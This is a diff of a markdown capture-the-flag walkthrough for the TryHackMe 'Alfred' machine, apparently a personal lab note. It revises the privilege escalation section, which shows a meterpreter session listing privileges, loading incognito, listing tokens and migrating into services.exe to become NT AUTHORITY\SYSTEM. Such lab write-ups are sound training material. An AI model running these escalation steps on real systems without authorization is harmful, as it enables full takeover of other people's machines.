@@ -159,13 +159,21 @@ This should return a meterpreter session
 
 
 
+### Escalating Privilages 
+
+Within the shell we run the command whoami /priv to check what permissions the user alfred has.
+
+
+
+![alfred-priv](/home/boolean/notes/tryhackme/assets/alfred-priv.png)
+
+
+
+The two permissions that are useful to use here are the SeImpersonatePrivilege and SeDebugPrivilege
+
+ 
+
 ```bash
-meterpreter > shell
-Process 2684 created.
-Channel 1 created.     
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-                                                    
 C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
 whoami /priv
                                                     
@@ -174,79 +182,27 @@ PRIVILEGES INFORMATION
                                                     
 Privilege Name                  Description                               State   
 =============================== ========================================= ========
-SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
-SeSecurityPrivilege             Manage auditing and security log          Disabled
-SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
-SeLoadDriverPrivilege           Load and unload device drivers            Disabled
-SeSystemProfilePrivilege        Profile system performance                Disabled
-SeSystemtimePrivilege           Change the system time                    Disabled
-SeProfileSingleProcessPrivilege Profile single process                    Disabled
-SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
-SeCreatePagefilePrivilege       Create a pagefile                         Disabled
-SeBackupPrivilege               Back up files and directories             Disabled
-SeRestorePrivilege              Restore files and directories             Disabled
-SeShutdownPrivilege             Shut down the system                      Disabled
+...
 SeDebugPrivilege                Debug programs                            Enabled 
-SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
-SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
-SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled  
-SeUndockPrivilege               Remove computer from docking station      Disabled  
-SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+...
 SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
-SeCreateGlobalPrivilege         Create global objects                     Enabled                                                                                                                                 
-SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled                                                                                                                                
-SeTimeZonePrivilege             Change the time zone                      Disabled                                                                                                                                
-SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled                                                                                                                                
-                                                                                                                                                                                                                  
-C:\Program Files (x86)\Jenkins\workspace\project>background                                                                                                                                                       
-background                                                                                                                                                                                                        
-'background' is not recognized as an internal or external command,                                                                                                                                                
-operable program or batch file.                                                                                                                                                                                   
-                                                                                                                                                                                                                  
-C:\Program Files (x86)\Jenkins\workspace\project>exit                                                                                                                                                             
-exit                                                                                                                                                                                                              
+
+​```
+```
+
+Exiting from the shell and returning to the meterpreter session we load the incognito module, and list all available tokens. The easiest way to think about incognito and tokens is using a cookie to gain access to another process. Using the list_tokens command we can see that BUILTIN\Administrators is available.
+
+```bash
 meterpreter > load incognito                                                                                                                                                                                      
 Loading extension incognito...Success.                                                                                                                                                                            
 meterpreter > list_tokens -g                                                                                                                                                                                      
 [-] Warning: Not currently running as SYSTEM, not all tokens will be available                                                                                                                                    
-             Call rev2self if primary process token is SYSTEM                                                                                                                                                     
-                                                                                                                                                                                                                  
+             Call rev2self if primary process token is SYSTEM                                                                                                                                                    
 Delegation Tokens Available                                                                                                                                                                                       
 ========================================                                                                                                                                                                          
-\                                                                                                                                                                                                                 
-BUILTIN\Administrators                                                                                                                                                                                            
-BUILTIN\IIS_IUSRS                                                                                                                                                                                                 
-BUILTIN\Users                                                                                                                                                                                                     
-NT AUTHORITY\Authenticated Users                                                                                                                                                                                  
-NT AUTHORITY\NTLM Authentication                                                                                                                                                                                  
-NT AUTHORITY\SERVICE                                                                                                                                                                                              
-NT AUTHORITY\This Organization                                                                                                                                                                                    
-NT AUTHORITY\WRITE RESTRICTED                                                                                                                                                                                     
-NT SERVICE\AppHostSvc                                                                                                                                                                                             
-NT SERVICE\AudioEndpointBuilder                                                                                                                                                                                   
-NT SERVICE\BFE                                                                                                                                                                                                    
-NT SERVICE\CertPropSvc                                                                                                                                                                                            
-NT SERVICE\CscService                                                                                                                                                                                             
-NT SERVICE\Dnscache                                                                                                                                                                                               
-NT SERVICE\eventlog                                                                                                                                                                                               
-NT SERVICE\EventSystem                                                                                                                                                                                            
-NT SERVICE\FDResPub                                                                                                                                                                                               
-NT SERVICE\iphlpsvc
-NT SERVICE\LanmanServer  
-NT SERVICE\MMCSS                 
-NT SERVICE\PcaSvc                    
-NT SERVICE\PlugPlay 
-NT SERVICE\RpcEptMapper
-NT SERVICE\Schedule
-NT SERVICE\SENS
-NT SERVICE\SessionEnv
-NT SERVICE\Spooler
-NT SERVICE\TrkWks
-NT SERVICE\UmRdpService
-NT SERVICE\UxSms
-NT SERVICE\Winmgmt
-NT SERVICE\WSearch
-NT SERVICE\wuauserv
+\                                                                                                                                 ...                                                                                
+BUILTIN\Administrators       
+...
 
 Impersonation Tokens Available
 ========================================
@@ -264,6 +220,11 @@ NT SERVICE\wscsvc
 
 meterpreter > getuid
 Server username: alfred\bruce
+```
+
+Now we look for a service that is running as NT AUTHORITY\SYSTEM, services.exe is a good one, so within meterpreter use the migrate command to switch to the services.exe pid. 
+
+```bash
 meterpreter > ps
 
 Process List
@@ -273,51 +234,23 @@ Process List
  ---   ----  ----                  ----  -------  ----                          ----
  0     0     [System Process]
  4     0     System                x64   0
- 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
- 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+ ...
  572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
  580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
  608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
  668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
- 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
- 684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
- 772   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
- 852   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
- 920   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
- 924   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
- 940   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
- 988   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
- 1012  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
- 1064  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
- 1212  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
- 1240  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
- 1300  1832  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
- 1356  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
- 1424  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
- 1456  1300  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
- 1460  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
- 1488  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
- 1560  1456  shell9003.exe         x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\workspace\project\shell9003.exe
- 1624  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
- 1720  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
- 1808  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
- 1832  1624  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
- 1856  668   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
- 1940  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
- 2124  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
- 2340  772   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
- 2460  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
- 2544  668   taskhost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\taskhost.exe
- 2868  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
- 2944  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
- 3060  668   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
-
+...
 meterpreter > migrate 668
 [*] Migrating from 1560 to 668...
 [*] Migration completed successfully.
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter > 
-
 ```
+
+If migration is successful then we can check that we are SYSTEM user by running the getuid command.
+
+
+
+# Box Rooted
 
